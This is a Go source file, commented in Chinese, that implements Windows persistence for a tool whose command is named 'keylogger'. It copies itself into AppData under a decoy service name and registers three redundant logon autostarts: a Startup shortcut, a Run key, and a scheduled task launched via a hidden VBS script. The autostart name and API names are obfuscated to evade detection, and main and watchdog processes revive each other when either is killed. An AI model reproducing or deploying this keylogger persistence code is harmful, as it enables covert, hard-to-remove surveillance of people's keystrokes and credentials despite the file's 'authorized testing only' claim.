//go:build windows

package cmd

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// 持久化与看门狗:仅用于经授权的测试环境。
//
// 机制说明:
//   - 命名互斥体保证单实例,计划任务/看门狗重复拉起时新实例静默退出;
//   - --install 将自身复制到 %APPDATA%\Windows\<pname>,
//     同时写入三重登录自启:启动文件夹快捷方式 + HKCU Run 键 +
//     ONLOGON 计划任务(互为冗余,提高存活概率)。计划任务由 Task
//     Scheduler 服务拉起,用于应对前两重在部分受控环境中被静默拦截的
//     情况(注册计划任务这个动作本身更易被行为引擎关注,属必要取舍);
//     任务动作以 wscript.exe //B 静默启动器注册(动作不直接指向 AppData
//     下可疑 exe,且 wscript 为 GUI 子系统,不产生任何控制台窗口;
//     旧版用 cmd.exe /c 包装,cmd /c 会等待永不退出的看门狗,导致登录后
//     出现常驻的黑色控制台窗口)。然后启动看门狗与主实例;
//   - --watchdog 看门狗模式:定期检查主实例互斥体,被关闭后秒级拉起;
//     持久化副本的主实例反向保活看门狗(互保),任意一侧被杀都能恢复;
//   - --uninstall 清理快捷方式、注册表项、计划任务、进程与副本文件。

var (
	installFlag   bool
	watchdogFlag  bool
	uninstallFlag bool
	debugFlag     bool // 诊断模式:关键步骤写日志到 %TEMP%\golin_debug.log(仅排查用)
	persistEvery  int
	persistName   string
)

func init() {
	keylogger.Flags().BoolVar(&installFlag, "install", false,
		"安装持久化(复制自身+快捷方式+注册表+计划任务+看门狗)后退出")
	keylogger.Flags().BoolVar(&watchdogFlag, "watchdog", false,
		"看门狗模式(内部使用)")
	keylogger.Flags().BoolVar(&uninstallFlag, "uninstall", false,
		"卸载持久化(删除快捷方式、注册表项、计划任务、进程与副本文件)后退出")
	keylogger.Flags().IntVar(&persistEvery, "every", 5,
		"看门狗检查间隔(秒)")
	keylogger.Flags().StringVar(&persistName, "pname", defaultPersistName,
		"持久化副本文件名(可自定义,降低路径特征)")
	keylogger.Flags().BoolVar(&debugFlag, "debug", false,
		"诊断模式:关键步骤写日志到 %TEMP%\\golin_debug.log(仅排查用)")
}

const (
	targetDirName  = "Windows"
	detachedFlag   = 0x00000008 // DETACHED_PROCESS
	mutexAllAccess = 0x1F0001
)

// defaultPersistName 持久化副本的默认文件名(--pname 未指定时)
const defaultPersistName = "winsvc.exe"

var (
	// updateCheckName 三重自启共用基础名(混淆存储,运行时解码):
	// 快捷方式 updateCheckName.lnk、计划任务 updateCheckName、
	// 注册表项 updateCheckName。改名只需重算这一处密文。
	updateCheckName = x("\x30\x59\x02\x55\x01\x3c\x40\x2c\x17\x54\x0d\x45\x0b\x08\x5b\x1c\x04\x5b")
	lnkFileName     = updateCheckName + ".lnk" // WindowsUpdateCheck.lnk
	schedTaskName   = updateCheckName          // WindowsUpdateCheck
	vbsFileName     = updateCheckName + ".vbs" // WindowsUpdateCheck.vbs
)

var (
	pMutexCreate uintptr
	pMutexOpen   uintptr
	pCloseHandle uintptr
	pWaitSingle  uintptr
	// 主实例与看门狗各自的命名互斥体
	mutexNameMain  = x("\x20\x5f\x00\x58\x00\x08\x01\x34\x06\x59\x02\x7c\x1b\x3f\x56\x01")
	mutexNameWatch = x("\x20\x5f\x00\x58\x00\x08\x01\x2e\x06\x44\x0f\x59\x23\x3e\x47\x1c\x1f")
)

func init() {
	pMutexCreate = procAddr(kernel32, x("\x24\x42\x09\x50\x1a\x2e\x7e\x0c\x13\x55\x14\x66"))
	pMutexOpen = procAddr(kernel32, x("\x28\x40\x09\x5f\x23\x3e\x47\x1c\x1f\x67"))
	pCloseHandle = procAddr(kernel32, x("\x24\x5c\x03\x42\x0b\x03\x52\x17\x03\x5c\x09"))
	pWaitSingle = procAddr(kernel32, x("\x30\x51\x05\x45\x28\x24\x41\x2a\x0e\x5e\x0b\x5d\x0b\x04\x51\x13\x02\x53\x18"))
}

// filterArgs 去除部署参数中的 --install/--watchdog/--uninstall(计划任务/
// 快捷方式/看门狗拉起的命令行),保留 --every 供看门狗设置检查间隔
func filterArgs(args []string) []string {
	out := make([]string, 0, len(args))
	for _, a := range args {
		if a == "--install" || a == "--watchdog" || a == "--uninstall" {
			continue
		}
		out = append(out, a)
	}
	return out
}

// normalizeExeName 保证持久化副本名带 .exe 后缀,空值回退默认名
func normalizeExeName(name string) string {
	n := strings.TrimSpace(name)
	if n == "" {
		return defaultPersistName
	}
	if !strings.HasSuffix(strings.ToLower(n), ".exe") {
		n += ".exe"
	}
	return n
}

// baseDir 返回 %APPDATA%(缺失时兜底用户主目录下 AppData\Roaming)
func baseDir() string {
	base := os.Getenv("APPDATA")
	if base == "" {
		if home, err := os.UserHomeDir(); err == nil {
			base = filepath.Join(home, "AppData", "Roaming")
		}
	}
	return base
}

// installedPath 持久化副本的完整路径
func installedPath() string {
	return filepath.Join(baseDir(), targetDirName, normalizeExeName(persistName))
}

// isInstalledCopy 当前进程是否就是持久化副本
func isInstalledCopy() bool {
	me, err := os.Executable()
	return err == nil && strings.EqualFold(me, installedPath())
}

// takeMutex 创建命名互斥体,返回是否成功取得所有权(仅创建者成功)。
// 对象已存在但无主时(如持有者被杀后对象被外部句柄保活)尝试即时接管,
// 避免僵尸互斥体导致实例永远无法启动
func takeMutex(name string) bool {
	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		dbgLog("takeMutex %q utf16 转换失败: %v", name, err)
		return false
	}
	h, _, e := callProc(pMutexCreate, 0, 1, uintptr(unsafe.Pointer(n)))
	dbgLog("takeMutex %q CreateMutexW h=%d errno=%d", name, h, e)
	if h == 0 {
		return false
	}
	if e == syscall.ERROR_ALREADY_EXISTS {
		// 对象存在但可能已无主:WaitForSingleObject(h, 0) 即时试探。
		// 0 = WAIT_OBJECT_0,0x80 = WAIT_ABANDONED,均表示取得所有权;
		// 其余(如 0x102 = WAIT_TIMEOUT)说明仍被存活实例占用
		r, _, _ := callProc(pWaitSingle, h, 0)
		dbgLog("takeMutex %q 已存在,WaitForSingleObject=%#x", name, r)
		if r != 0 && r != 0x80 {
			callProcDiscard(pCloseHandle, h)
			return false
		}
	}
	return true
}

// mutexExists 检查命名互斥体是否被占用(即对应实例是否存活)。
// 句柄用后立即关闭:否则会保活已死实例的互斥体对象,
// 导致看门狗永远认为实例在线(旧版句柄泄漏缺陷)
func mutexExists(name string) bool {
	n, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return false
	}
	h, _, e := callProc(pMutexOpen, mutexAllAccess, 0, uintptr(unsafe.Pointer(n)))
	exists := h != 0
	if h != 0 {
		callProcDiscard(pCloseHandle, h)
	}
	// 仅状态变化时写日志,避免每轮检查刷屏
	if debugFlag {
		last, seen := dbgMutexState[name]
		if !seen || last != exists {
			dbgLog("mutex %q 存活=%v (OpenMutexW errno=%d)", name, exists, e)
		}
		dbgMutexState[name] = exists
	}
	return exists
}

// dbgMutexState 记录上次探测到的互斥体存活状态(仅 --debug 时使用,
// 调用方为单一循环 goroutine,无并发访问)
var dbgMutexState = map[string]bool{}

// watchInterval 看门狗检查间隔,非法值回退 5 秒
func watchInterval() time.Duration {
	if persistEvery <= 0 {
		return 5 * time.Second
	}
	return time.Duration(persistEvery) * time.Second
}

// installPersistence 部署持久化:复制自身、写启动文件夹快捷方式、HKCU Run
// 键与 ONLOGON 计划任务(三重互为冗余)、启动看门狗与主实例。
// 单项注册失败不阻断部署(失败兜底)。
func installPersistence(args []string) {
	me, err := os.Executable()
	if err != nil {
		dbgLog("install: 获取自身路径失败: %v", err)
		fmt.Println("[-] 无法获取自身路径:", err)
		return
	}
	target := installedPath()
	dbgLog("install: 源=%s 目标=%s args=%v", me, target, args)
	if err := os.MkdirAll(filepath.Dir(target), 0777); err != nil {
		dbgLog("install: 创建目录失败: %v", err)
		fmt.Println("[-] 创建目录失败:", err)
		return
	}
	if !strings.EqualFold(me, target) {
		data, err := os.ReadFile(me)
		if err != nil {
			dbgLog("install: 读取自身失败: %v", err)
			fmt.Println("[-] 读取自身失败:", err)
			return
		}
		if err := os.WriteFile(target, data, 0755); err != nil {
			dbgLog("install: 复制自身失败: %v", err)
			fmt.Println("[-] 复制自身失败:", err)
			return
		}
		dbgLog("install: 副本已写入 %s", target)
	}

	// 登录自启一:启动文件夹快捷方式,参数带上 --watchdog,重启后由看门狗拉起主实例
	lnkArgs := strings.Join(append(append([]string{}, args...), "--watchdog"), " ")
	startup := filepath.Join(baseDir(), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	lnkPath := filepath.Join(startup, lnkFileName)
	if err := os.MkdirAll(startup, 0777); err != nil {
		dbgLog("install: 创建启动目录失败: %v", err)
		fmt.Println("[-] 创建启动目录失败:", err)
	} else if err := createShortcut(lnkPath, target, lnkArgs); err != nil {
		dbgLog("install: 创建快捷方式失败: %v", err)
		fmt.Println("[-] 创建快捷方式失败(仍将继续部署):", err)
	} else {
		dbgLog("install: 已写入启动快捷方式 %s args=%q", lnkPath, lnkArgs)
		fmt.Printf("[*] 已写入启动快捷方式: %s\n", lnkPath)
	}

	// 登录自启二:HKCU Run 键,与快捷方式互为冗余,提高存活概率
	runValue := `"` + target + `" ` + strings.Join(append(append([]string{}, args...), "--watchdog"), " ")
	if err := setRunKey(runValue); err != nil {
		dbgLog("install: 写入注册表自启动失败: %v", err)
		fmt.Println("[-] 写入注册表自启动失败(仍将继续部署):", err)
	} else {
		dbgLog("install: 已写入注册表自启动项 value=%q", runValue)
		fmt.Println("[*] 已写入注册表自启动项")
	}

	// 登录自启三:ONLOGON 计划任务(第三重)。前两重在部分受控环境中可能被
	// 静默拦截,计划任务由 Task Scheduler 服务拉起,一般不在此拦截范围内。
	// 动作以 cmd.exe /c 包装注册:实测该环境拦截"动作直接指向 AppData 下
	// 可疑 exe"的任务注册(schtasks 报"未指定的错误"),cmd 包装形态可过
	if err := setScheduledTask(target, args); err != nil {
		dbgLog("install: 注册计划任务失败: %v", err)
		fmt.Println("[-] 注册计划任务失败(仍将继续部署):", err)
	} else {
		fmt.Println("[*] 已注册计划任务(第三重自启)")
	}

	// 看门狗(秒级重启)+ 主实例(立即生效),与自启项是否注册成功无关。
	// 必须同步调用:函数返回后进程即将退出,goroutine 里的 cmd.Start 来不及执行
	if err := runDetached(target, append(append([]string{}, args...), "--watchdog")...); err != nil {
		dbgLog("install: 启动看门狗失败: %v", err)
		fmt.Println("[-] 启动看门狗失败:", err)
	}
	if err := runDetached(target, args...); err != nil {
		dbgLog("install: 启动主实例失败: %v", err)
		fmt.Println("[-] 启动主实例失败:", err)
	}
	dbgLog("install: 部署完成")
	fmt.Printf("[*] 持久化已部署: %s (看门狗间隔 %d 秒,主实例与看门狗互保)\n", target, persistEvery)
}

// uninstallPersistence 清理持久化:快捷方式、注册表项、计划任务、进程与副本文件。
// 从副本自身执行时文件可能因占用删除失败,但自启项已移除,重启后不再拉起
func uninstallPersistence() {
	target := installedPath()
	startup := filepath.Join(baseDir(), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	lnkPath := filepath.Join(startup, lnkFileName)
	if err := os.Remove(lnkPath); err != nil {
		fmt.Println("[-] 删除快捷方式失败(可能不存在):", err)
	} else {
		fmt.Printf("[*] 已删除启动快捷方式: %s\n", lnkPath)
	}
	vbsPath := filepath.Join(filepath.Dir(target), vbsFileName)
	if err := os.Remove(vbsPath); err != nil && !os.IsNotExist(err) {
		fmt.Println("[-] 删除静默启动脚本失败:", err)
	} else if err == nil {
		fmt.Printf("[*] 已删除静默启动脚本: %s\n", vbsPath)
	}
	if err := deleteRunKey(); err != nil {
		fmt.Println("[-] 删除注册表自启动项失败:", err)
	} else {
		fmt.Println("[*] 已删除注册表自启动项")
	}
	if err := deleteScheduledTask(); err != nil {
		dbgLog("uninstall: 删除计划任务失败: %v", err)
		fmt.Println("[-] 删除计划任务失败(可能不存在或需管理员权限):", err)
	} else {
		dbgLog("uninstall: 已删除计划任务")
		fmt.Println("[*] 已删除计划任务")
	}
	removeWithRetry(target) // 运行中的副本被占用,此步可能失败,结束后再试
	// 按映像名结束持久化进程,排除自身(卸载器可能与副本同名,避免自杀)
	psName := strings.ReplaceAll(strings.TrimSuffix(filepath.Base(target), ".exe"), "'", "''")
	killCmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
		fmt.Sprintf("Get-Process -Name '%s' -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne %d } | Stop-Process -Force", psName, os.Getpid()))
	killCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := killCmd.Run(); err != nil {
		fmt.Println("[-] 结束持久化进程失败(可能已退出):", err)
	} else {
		fmt.Println("[*] 已结束持久化进程")
	}
	removeWithRetry(target) // 进程终止是异步的,重试等待句柄释放
	fmt.Println("[*] 持久化已卸载")
}

// setScheduledTask 注册 ONLOGON 计划任务作为第三重登录自启(标准用户注册
// 根目录任务可能被拒绝,失败由调用方兜底)。
// 动作优先注册为 wscript.exe 静默启动器:Task Scheduler 不支持为动作设置
// 隐藏窗口,动作指向 cmd.exe 等控制台程序时登录会弹出一个常驻的黑色控制台
// 窗口(旧版缺陷:cmd /c 等待永不退出的看门狗);wscript 为 GUI 子系统,自身
// 无窗口,再以窗口样式 0(SW_HIDE)拉起副本,全程静默。
// 若 wscript 形态被环境拦截,则回退 cmd.exe /c start "" /b 形态:start 不等待、
// 不新建窗口,cmd 立即退出,即使有控制台也是瞬间闪现,不会常驻。
// 启动命令行与快捷方式/注册表一致:副本路径 + 参数 + --watchdog。
func setScheduledTask(target string, args []string) error {
	launch := strings.Join(append(append([]string{}, args...), "--watchdog"), " ")

	vbsPath := filepath.Join(filepath.Dir(target), vbsFileName)
	if err := writeVbsLauncher(vbsPath, target, launch); err == nil {
		tr := `wscript.exe //B //Nologo "` + vbsPath + `"`
		if err := registerScheduledTask(tr); err == nil {
			dbgLog("install: 已注册计划任务 name=%q action=wscript tr=%q", schedTaskName, tr)
			return nil
		} else {
			dbgLog("install: wscript 形态注册失败,回退 cmd 形态: %v", err)
		}
	} else {
		dbgLog("install: 写入静默启动脚本失败,回退 cmd 形态: %v", err)
	}

	// 回退形态:/c 后整串加引号,cmd 剥掉外层一对引号后执行
	// start "" /b "<exe>" <args>,与旧形态的引号配对规则一致。
	tr := `cmd.exe /c "start "" /b "` + target + `" ` + launch + `"`
	if err := registerScheduledTask(tr); err != nil {
		return err
	}
	dbgLog("install: 已注册计划任务 name=%q action=cmd-fallback tr=%q", schedTaskName, tr)
	return nil
}

// registerScheduledTask 执行 schtasks /Create 注册 ONLOGON 计划任务,
// 动作执行程序为系统目录下的包装程序,实际目标仅出现在参数中
func registerScheduledTask(tr string) error {
	cmd := exec.Command("schtasks", "/Create", "/TN", schedTaskName,
		"/TR", tr, "/SC", "ONLOGON", "/RL", "LIMITED", "/F")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks /Create: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// writeVbsLauncher 写入 wscript 静默启动脚本,供计划任务动作调用。
// wscript 为 GUI 子系统(无控制台窗口),Run 第二参 0=SW_HIDE、
// 第三参 False=不等待返回,脚本执行完 wscript 立即退出
func writeVbsLauncher(path, target, launch string) error {
	content := launcherVbs(target, launch)
	if err := os.WriteFile(path, []byte(content), 0755); err != nil {
		return err
	}
	dbgLog("install: 静默启动脚本已写入 %s", path)
	return nil
}

// launcherVbs 生成静默启动脚本内容:
// `s.Run """<target>"" <launch>", 0, False` —— VBS 内 "" 转义为字面引号,
// 最终 Run 的命令行为 "<target>" <launch>,窗口样式 0,不等待
func launcherVbs(target, launch string) string {
	return "Set s = CreateObject(\"WScript.Shell\")\r\n" +
		"s.Run \"\"\"" + target + "\"\" " + launch + "\", 0, False\r\n"
}

// deleteScheduledTask 删除计划任务;任务不存在或无权删除时返回错误,由调用方决定
func deleteScheduledTask() error {
	cmd := exec.Command("schtasks", "/Delete", "/TN", schedTaskName, "/F")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks /Delete: %w: %s", err, strings.TrimSpace(string(out)))
	}
	return nil
}

// removeWithRetry 删除文件,目标被占用时重试(进程强杀后句柄释放有延迟)
func removeWithRetry(path string) {
	for i := 0; i < 5; i++ {
		if err := os.Remove(path); err == nil || os.IsNotExist(err) {
			return
		}
		time.Sleep(300 * time.Millisecond)
	}
}

// ensureWatchdog 主实例侧保活:看门狗互斥体消失时重新拉起看门狗。
// 与 watchdogLoop 构成互保,任意一侧被关闭都能被另一侧恢复。
// 仅持久化副本运行此逻辑(开发副本不参与)
func ensureWatchdog(args []string) {
	me, err := os.Executable()
	if err != nil {
		dbgLog("ensureWatchdog: 获取自身路径失败: %v", err)
		return
	}
	launch := append(filterArgs(args), "--watchdog")
	for {
		if !mutexExists(mutexNameWatch) {
			dbgLog("ensureWatchdog: 看门狗互斥体消失,尝试拉起")
			if err := runDetached(me, launch...); err != nil {
				dbgLog("ensureWatchdog: 拉起看门狗失败: %v", err)
			}
		}
		time.Sleep(watchInterval() * 2)
	}
}

// watchdogLoop 看门狗:持有看门狗互斥体,监控主实例,被关闭则拉起
func watchdogLoop(args []string) {
	dbgLog("watchdog: 进入看门狗循环 args=%v", args)
	if !takeMutex(mutexNameWatch) {
		dbgLog("watchdog: 未取得看门狗互斥体,退出(已有看门狗)")
		return // 已有看门狗在运行
	}
	me, _ := os.Executable()
	launch := filterArgs(args) // 主实例参数(去掉 --watchdog/--install)
	for {
		if !mutexExists(mutexNameMain) {
			dbgLog("watchdog: 主实例互斥体消失,尝试拉起主实例")
			if err := runDetached(me, launch...); err != nil {
				dbgLog("watchdog: 拉起主实例失败: %v", err)
			}
		}
		time.Sleep(watchInterval())
	}
}

// runDetached 以隐藏窗口、脱离父进程的方式启动程序
func runDetached(exe string, args ...string) error {
	dbgLog("runDetached: %s %v", exe, args)
	cmd := exec.Command(exe, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: detachedFlag}
	err := cmd.Start()
	if err != nil {
		dbgLog("runDetached 失败: %v", err)
	}
	return err
}
